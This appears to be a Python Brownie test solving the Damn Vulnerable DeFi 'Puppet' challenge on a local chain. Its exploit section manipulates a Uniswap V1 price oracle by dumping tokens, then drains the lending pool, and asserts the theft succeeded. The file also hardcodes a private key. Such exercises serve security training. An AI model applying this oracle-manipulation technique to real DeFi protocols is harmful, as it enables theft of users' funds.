import json
from brownie.network.state import Chain
from web3 import Web3, eth
from brownie import (
    accounts,
    DamnValuableToken,
    PuppetPool,
)
from brownie.network.account import Account
from brownie.network.contract import Contract
from brownie.network.transaction import TransactionReceipt
from brownie import Wei
from decimal import Decimal

random_account = "0x3757785e08EBa4cE23E8ECaEC34CEA6a9912fb1B"
random_account_private_key = (
    "83ea5ca5fef0160b3fb985066b6c29d473767adfcc711715bb52c507f6650d2a"
)


def load_abi_bytecode(filename):
    with open(f"./build-uniswap-v1/{filename}", "r") as f:
        artifact = json.loads(f.read())
        return (artifact["abi"], artifact["bytecode"])


def deploy_bytecode(abi, bytecode, from_address, private_key):
    chain_id = 1337
    w3 = Web3(Web3.HTTPProvider("http://0.0.0.0:8545"))

    # Create the contract in Python
    Contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    # Get the latest transaction
    nonce = w3.eth.get_transaction_count(from_address)
    # Submit the transaction that deploys the contract
    transaction = Contract.constructor().buildTransaction(
        {"chainId": chain_id, "from": from_address, "nonce": nonce}
    )
    # Sign the transaction
    signed_txn = w3.eth.account.sign_transaction(transaction, private_key=private_key)
    # Send it!
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    # Wait for the transaction to be mined, and get the transaction receipt
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt.contractAddress


def calculate_token_to_eth_input_price(token_sold, token_in_reserve, ether_in_reserve):
    token_sold = Decimal(token_sold)
    token_in_reserve = Decimal(token_in_reserve)
    ether_in_reserve = Decimal(ether_in_reserve)
    return Wei(
        token_sold
        * 997
        * ether_in_reserve
        / (token_in_reserve * 1000 + token_sold * 997)
    )


def test_puppet():
    a0: Account = accounts[0]
    a0.transfer(random_account, 1000e18)

    attacker = accounts.add()

    deployer = accounts.add(random_account_private_key)

    UNISWAP_INITIAL_TOKEN_RESERVE = 10e18
    UNISWAP_INITIAL_ETH_RESERVE = 10e18
    POOL_INITIAL_TOKEN_BALANCE = 10000e18
    ATTACKER_INITAL_TOKEN_BALANCE = 100e18

    # Deploy token to be traded in Uniswap
    token = DamnValuableToken.deploy({"from": deployer})

    # Deploy a exchange that will be used as the factory template
    exchange_abi, exchange_bytecode = load_abi_bytecode("UniswapV1Exchange.json")
    exchange_address = deploy_bytecode(
        exchange_abi, exchange_bytecode, random_account, random_account_private_key
    )
    exchange_template = Contract.from_abi(
        "UniswapV1Exchange", exchange_address, exchange_abi
    )

    # Deploy factory, initializing it with the address of the template exchange
    factory_abi, factory_bytecode = load_abi_bytecode("UniswapV1Factory.json")
    factory_address = deploy_bytecode(
        factory_abi, factory_bytecode, random_account, random_account_private_key
    )
    uniswap_factory = Contract.from_abi(
        "UniswapV1Factory", factory_address, factory_abi
    )
    uniswap_factory.initializeFactory(
        exchange_template.address, {"from": deployer}
    ).wait(1)

    # Create a new exchange for the token, and retrieve the deployed exchange's addres
    tx: TransactionReceipt = uniswap_factory.createExchange(
        token.address, {"from": deployer}
    )
    tx.wait(1)
    new_exchange_address = tx.logs[0]["topics"][2]
    new_exchange_address = "0x" + new_exchange_address.hex()[-40:]
    uniswap_exchange = Contract.from_abi(
        "UniswapV1Exchnage", new_exchange_address, exchange_abi
    )

    # Deploy the lending pool
    lending_pool = PuppetPool.deploy(
        token.address, uniswap_exchange.address, {"from": deployer}
    )

    # Add initial token and ETH liquidity to the pool
    token.approve(
        uniswap_exchange.address, UNISWAP_INITIAL_ETH_RESERVE, {"from": deployer}
    )
    DEADLINE = 1e10
    uniswap_exchange.addLiquidity(
        0,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        DEADLINE,
        {"from": deployer, "amount": UNISWAP_INITIAL_ETH_RESERVE},
    )

    # Ensure Uniswap exchange is working as expected
    assert uniswap_exchange.getTokenToEthInputPrice(
        1e18
    ) == calculate_token_to_eth_input_price(
        1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE
    )

    # Setup initial token balances of pool and attacker account
    token.transfer(attacker.address, ATTACKER_INITAL_TOKEN_BALANCE, {"from": deployer})
    deployer.transfer(attacker, 100e18)
    token.transfer(lending_pool.address, POOL_INITIAL_TOKEN_BALANCE, {"from": deployer})

    # Rate should be 1:1
    assert lending_pool.computeOraclePrice() == 1

    # Track attacker's initial ETH balance (to ensure it doesn't decrease)
    inital_attacker_eth_balance = attacker.balance()

    # YOUR EXPLOIT GOES HERE
    token.approve(
        uniswap_exchange.address, ATTACKER_INITAL_TOKEN_BALANCE, {"from": attacker}
    )
    uniswap_exchange.tokenToEthSwapInput(
        ATTACKER_INITAL_TOKEN_BALANCE, 1, DEADLINE, {"from": attacker}
    )
    lending_pool.borrow(token.balanceOf(lending_pool.address), {"from": attacker})

    # SUCCESS CONDITIONS
    # Attacker has stolen all tokens from the pool
    assert token.balanceOf(attacker.address) >= POOL_INITIAL_TOKEN_BALANCE
    assert token.balanceOf(lending_pool.address) == 0
    # Attacker ETH balance has not decreased
    assert attacker.balance() >= inital_attacker_eth_balance
